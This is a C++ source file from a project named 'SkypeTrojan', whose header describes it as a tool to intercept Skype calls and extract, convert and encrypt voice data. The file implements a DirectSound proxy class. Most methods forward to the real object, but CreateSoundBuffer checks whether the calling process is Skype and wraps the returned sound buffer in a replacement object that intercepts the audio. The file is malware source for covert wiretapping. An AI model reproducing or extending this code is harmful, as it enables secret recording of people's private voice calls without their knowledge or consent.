/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */




/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */







#include <windows.h>
#include <dsound.h>
#include <stdio.h>
#include "IDirectSoundReplacement.h"
#include "IDirectSoundBufferReplacement.h"


extern char gProcName[MAX_BUF_SIZE + 1];
extern int gVoIPVersionApplication;




/*
 * Constructors + destructor
 *
 */

//IDirectSoundReplacement::IDirectSoundReplacement(IDirectSound *pIDirectSoundOriginal)
IDirectSoundReplacement::IDirectSoundReplacement(IDirectSound *pIDirectSoundOriginal)
{
  mIDirectSoundOriginal = pIDirectSoundOriginal;
}

IDirectSoundReplacement::IDirectSoundReplacement()
{
}


IDirectSoundReplacement::~IDirectSoundReplacement()
{
  if (mIDirectSoundOriginal)
    mIDirectSoundOriginal->~IDirectSound();
}










/*
 * Increment the reference counter
 *
 */

ULONG __stdcall IDirectSoundReplacement::AddRef()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->AddRef();

  return(mRetVal);
}




/*
 * Decrement the reference counter.
 *
 */

ULONG __stdcall IDirectSoundReplacement::Release()
{
  ULONG mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->Release();

  return(mRetVal);
}





/*
 * Query the DS instance.
 *
 */

HRESULT __stdcall IDirectSoundReplacement::QueryInterface(REFIID iid,  LPVOID *ppv)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->QueryInterface(iid, ppv);

  return(mRetVal);
}





/*
 * Get current caps settings
 *
 */

HRESULT __stdcall IDirectSoundReplacement::GetCaps(LPDSCAPS pDSCaps)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->GetCaps(pDSCaps);

  return(mRetVal);
}






/*
 * Initializes a device object that was created by using the CoCreateInstance functio
 *
 */

HRESULT __stdcall IDirectSoundReplacement::Initialize(LPCGUID pcGuidDevice)
{
  HRESULT mRetVal = ERROR_SUCCESS;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->Initialize(pcGuidDevice);

  return(mRetVal);
}



/*
 * creates a new secondary buffer that shares the original buffer's memory
 *
 */

HRESULT __stdcall IDirectSoundReplacement::DuplicateSoundBuffer(LPDIRECTSOUNDBUFFER pDSBufferOriginal, LPDIRECTSOUNDBUFFER * ppDSBufferDuplicate)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->DuplicateSoundBuffer(pDSBufferOriginal, ppDSBufferDuplicate);

  return(mRetVal);
}





/*
 * Sets the cooperative level of the application for this sound device
 *
 */

HRESULT __stdcall IDirectSoundReplacement::SetCooperativeLevel(HWND hwnd, DWORD dwLevel)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->SetCooperativeLevel(hwnd, dwLevel);

  return(mRetVal);
}


/*
 *
 *
 */

HRESULT __stdcall IDirectSoundReplacement::Compact()
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->Compact();

  return(mRetVal);
}




/*
 * Specifies the speaker configuration of the device
 *
 */

HRESULT __stdcall IDirectSoundReplacement::SetSpeakerConfig(DWORD dwSpeakerConfig)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->SetSpeakerConfig(dwSpeakerConfig);

  return(mRetVal);
}





/*
 * Retrieves the speaker configuratio
 *
 */

HRESULT __stdcall IDirectSoundReplacement::GetSpeakerConfig(LPDWORD pdwSpeakerConfig)
{
  HRESULT mRetVal = DSERR_INVALIDPARAM;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->GetSpeakerConfig(pdwSpeakerConfig);

  return(mRetVal);
}







/*
 * Creates a sound buffer object to manage audio samples
 *
 */

HRESULT __stdcall IDirectSoundReplacement::CreateSoundBuffer(LPCDSBUFFERDESC pcDSBufferDesc, LPDIRECTSOUNDBUFFER * ppDSBuffer, LPUNKNOWN pUnkOuter)
{
  HRESULT mRetVal = 0;

  if (mIDirectSoundOriginal != NULL)
    mRetVal = mIDirectSoundOriginal->CreateSoundBuffer(pcDSBufferDesc, ppDSBuffer, pUnkOuter);


  /*
   * Determine what application called us
   *
   */

  if (strstr(gProcName, TARGET7)
			|| strstr(gProcName, TARGET8)
			|| strstr(gProcName, TARGET9))
    gVoIPVersionApplication = SKYPE_3;


  /*
   * sit in between the caller and the real destination object (callee)
   *
   */

  *ppDSBuffer = new IDirectSoundBufferReplacement(*ppDSBuffer, pcDSBufferDesc->dwBufferBytes);


  return(mRetVal);
}


